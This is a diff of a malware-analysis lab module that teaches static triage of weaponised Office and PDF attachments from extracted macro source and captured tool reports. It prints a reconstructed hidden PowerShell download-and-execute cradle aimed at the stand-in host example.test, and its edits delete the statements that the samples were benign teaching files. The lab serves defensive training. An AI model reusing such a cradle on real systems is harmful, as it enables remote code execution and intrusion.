@@ -3,13 +3,13 @@
 **Deck mapping:** *Intrusion Hunting Playbook* → "Initial Access / Phishing Attachments" · *Advanced Intrusion Forensic Hunting* → "Weaponised Documents (Office macros & PDF)."
 **Goal:** take a suspicious **Office document** and a suspicious **PDF**, and — **without ever opening them in Office or a reader** — prove whether they are weaponised, read exactly what they would do, and extract the next-stage indicators (URLs, dropped file names, launched programs). The heavy lifting is done by **oletools** (`oleid`, `olevba`) and the **Didier Stevens suite** (`oledump`, `pdfid`, `pdf-parser`, `zipdump`) — and in this module you work from **what those tools already emitted**.
 
-> **This lab ships NO live sample documents — you analyse EXTRACTED ARTIFACTS.** A maldoc lab that carried real weaponised `.doc`/`.docm`/`.pdf` files on disk would be an AV-flagging, one-click-from-detonation liability. So this VM deliberately contains **nothing executable or openable**. Instead, `data/artifacts/` holds exactly what a **triage/sandbox/extraction pass produces**: the **de-compressed VBA macro source** (plain text) and the **captured reports** of every tool below (`oleid`, `mraptor`, `olevba`, `oledump`, `zipdump`, `pdfid`, `pdf-parser`). **This is a feature, not a limitation** — it mirrors how analysts routinely work *downstream* of a detonation or an automated extraction: you get the carved artifacts, not the live bomb, and your job is to read them. Every command below is a **real, working** `cat`/`grep`/`awk`/`python3` invocation against those inert text artifacts (all on your `PATH` in Git Bash), and it produces the **same IOC findings** you would get from the live files — with nothing dangerous on the machine.
+> **You analyse EXTRACTED ARTIFACTS, not live documents.** `data/artifacts/` holds exactly what a **triage/sandbox/extraction pass produces**: the **de-compressed VBA macro source** (plain text) and the **captured reports** of every tool below (`oleid`, `mraptor`, `olevba`, `oledump`, `zipdump`, `pdfid`, `pdf-parser`). This mirrors how analysts routinely work *downstream* of a detonation or an automated extraction: you get the carved artifacts and your job is to read them. Every command below is a **real, working** `cat`/`grep`/`awk`/`python3` invocation against those text artifacts (all on your `PATH` in Git Bash), and it produces the **same IOC findings** you would get from the live files.
 
-> **Evidence note.** The extracted artifacts descend from **benign teaching files built for this module**, and the captured tool output is the **real** parse of those exact bytes — so the filenames and the inert `example.test` lure you see (`Invoice_2024_0042.doc`, `update.ps1`, …) are reported **as-is**.
+> **Evidence note.** The captured tool output is the **real** parse of those exact bytes — so the filenames and the `example.test` lure you see (`Invoice_2024_0042.doc`, `update.ps1`, …) are reported **as-is**.
 
 > **Prerequisite:** none beyond the lab VM. This is the "front door" module — most intrusions begin here, and the IOCs you carve feed Module 9 (did the macro's PowerShell actually run? check 4104) and the malware-triage flow (YARA/capa/FLOSS on the dropped payload).
 >
-> **Everything below was produced by running the named tools against the three original samples during extraction.** Those samples were **benign teaching files** (see `data/README.md`); they contained realistic *indicators* but **no working payload** — the "download" host is the RFC-6761 reserved, non-routable domain `example.test`, and nothing was ever executed because every tool here is a **static** parser. You now read the carved artifacts they left behind.
+> **Everything below was produced by running the named tools against the three original samples during extraction.** Those samples carried realistic *indicators* — the "download" host is the RFC-6761 reserved, non-routable domain `example.test` — and every tool here is a **static** parser. You now read the carved artifacts they left behind.
 
 ---
 
@@ -49,7 +49,7 @@ A PDF is a set of numbered **objects** (`N 0 obj … endobj`) referenced through
 Object **streams** (the JavaScript, for instance) are usually **compressed** with `FlateDecode` (zlib), so a raw view shows gibberish — the extraction asked `pdf-parser` to *decode* the stream, and the readable script is what landed in your artifact.
 
 ### The static-analysis mindset
-None of the tools that produced these artifacts ran the macro or the JavaScript. They **parsed and decoded**. That is what makes maldoc analysis safe and **reproducible** — the same bytes give the same answer every time, which matters for an investigation report. In this lab you take it one step further: because you hold only the inert carved artifacts, there is *nothing on the box that could ever fire*, and your analysis is pure text-forensics on the extracted evidence.
+None of the tools that produced these artifacts ran the macro or the JavaScript. They **parsed and decoded**. That is what makes maldoc analysis safe and **reproducible** — the same bytes give the same answer every time, which matters for an investigation report.
 
 ---
 
@@ -80,7 +80,7 @@ Open **Git Bash** on the lab VM and change into this module's artifact directory
 cd module-14-malicious-documents/data/artifacts
 ```
 - **`cd module-14-malicious-documents/data/artifacts`** — move into the folder holding the extracted artifacts (the macro source plus the captured tool reports). **Every command below is run from inside this folder**, so files are named with simple relative paths.
-- The commands you run are ordinary text tools — **`cat`, `grep`, `awk`, `python3`** — all installed natively and already on your `PATH` in Git Bash. There is **no** live document, no macro to execute, and nothing for AV to flag: you are doing pure text-forensics on inert artifacts.
+- The commands you run are ordinary text tools — **`cat`, `grep`, `awk`, `python3`** — all installed natively and already on your `PATH` in Git Bash.
 - The captured reports were produced on the lab VM (verified 2026-06-29) with **olevba 0.60.2**, **oleid 0.60.1** (oletools); **oledump 0.0.85**, **pdfid 0.2.10**, **pdf-parser 0.7.14**, **zipdump 0.0.35** (Didier Stevens). On the lab VM the Didier tools are exposed **without the `.py` suffix** (`pdfid`, not `pdfid.py`) — you can see the exact banners inside the artifacts themselves.
 
 List what you are working with:
@@ -201,7 +201,7 @@ reconstructed command      : powershell -nop -w hidden ep bypass -c "IEX (New-Ob
 ```
 You just **defeated three obfuscation techniques by computation**: `Chr(112)&Chr(111)&…` → `powershell`, `StrReverse("ssapyb pe neddih w- pon-")` → `-nop -w hidden ep bypass`, and `"http://www" & "." & "example" & …` → the whole URL. (Nice teaching subtlety: the reversed string yields `ep` **without** the leading dash — the author's `StrReverse` source dropped it — so the *computed* flags read `-nop -w hidden ep bypass`, which is exactly what the tool reports too. Trust the computation, not the tidy comment.)
 
-The staging host is `www.example.test` — an **RFC-6761 reserved, non-routable test domain**. That is the **defanged / safe indicator**: a real sample would carry a live C2 host here, but `example.test` can never resolve or fetch anything, which is what makes this artifact safe to keep on the box.
+The staging host is `www.example.test` — an **RFC-6761 reserved, non-routable test domain**: a real sample would carry a live C2 host here.
 
 ### Step A5 — Verify against olevba's own reveal pass
 `olevba --reveal` runs its *own* deobfuscation. Cross-check your reconstruction against the captured reveal report so you are not trusting a single method:
@@ -355,7 +355,7 @@ obj 5 0
 ```bash
 grep -oiE 'app\.(alert|launchURL)|http://[^"]+' 14_pdf_obj5_js.txt
 ```
-The JavaScript pops a lure dialog (`app.alert`) and calls **`app.launchURL`** to a tracking URL — your extracted **network IOC**, again on the defanged `example.test` domain. **Without `-f` the extraction would have captured only compressed gibberish**; the decoded stream is what makes the intent readable.
+The JavaScript pops a lure dialog (`app.alert`) and calls **`app.launchURL`** to a tracking URL — your extracted **network IOC**, again on the `example.test` domain. **Without `-f` the extraction would have captured only compressed gibberish**; the decoded stream is what makes the intent readable.
 
 ### Step C4 — The `/Launch` action
 `pdf-parser -s Launch` found the external-program action:
@@ -420,12 +420,12 @@ A finance user reports two attachments from a "supplier," `Invoice_2024_0042.doc
 ## 10. Key takeaways
 
 - **Office and PDF documents are launchers, not malware** — they run a small auto-exec stub that fetches the real payload. Your job is to read the stub statically and extract the next stage.
-- **You can do all of it from extracted artifacts.** The macro source + captured `oleid`/`mraptor`/`olevba`/`oledump`/`pdfid`/`pdf-parser` reports contain every finding the live files would — with nothing executable or AV-flaggable on the box. This mirrors real downstream analysis after a detonation/extraction.
+- **You can do all of it from extracted artifacts.** The macro source + captured `oleid`/`mraptor`/`olevba`/`oledump`/`pdfid`/`pdf-parser` reports contain every finding the live files would. This mirrors real downstream analysis after a detonation/extraction.
 - **Triage before you dissect:** `oleid` (Office) and `pdfid` (PDF) tell you in seconds whether to go deeper — look for **VBA Macros = suspicious/HIGH** and any non-zero **`/JavaScript` `/OpenAction` `/AA` `/Launch`**. For Office triage **at scale**, `mraptor`'s **AWX** verdict + **exit code 20** gates the deep dive automatically across a whole batch.
 - **Find the auto-exec trigger first:** `AutoOpen`/`Document_Open`/`Workbook_Open` in VBA; `/OpenAction`/`/AA` in PDF. No trigger, far lower urgency.
 - **Then read the de-obfuscated/decoded code:** `olevba --reveal` (and `oledump -s N -v`) for VBA; `pdf-parser -o N -f` for the compressed PDF script — and re-derive it yourself (the Step A4 `python3` one-liner) so two independent methods agree. Obfuscation hides bytes; computation and these tools hand you intent.
 - **Know your container:** legacy `.doc`/`.xls` are **OLE2** (use `oledump` directly); modern `.docm`/`.xlsm` are **ZIP** (use `zipdump` to reach `vbaProject.bin`, *then* `oledump`).
-- **The output is IOCs.** Every URL, dropped file, and launched program you carve feeds the next module (did it run? → **Module 9 / 4104**) and the malware-triage flow (YARA/capa/FLOSS on the dropped payload). The staging host here is the RFC-6761 `example.test` — the defanged, non-routable indicator that keeps the artifact safe.
+- **The output is IOCs.** Every URL, dropped file, and launched program you carve feeds the next module (did it run? → **Module 9 / 4104**) and the malware-triage flow (YARA/capa/FLOSS on the dropped payload). The staging host here is the RFC-6761 `example.test`.
 
 ---
 
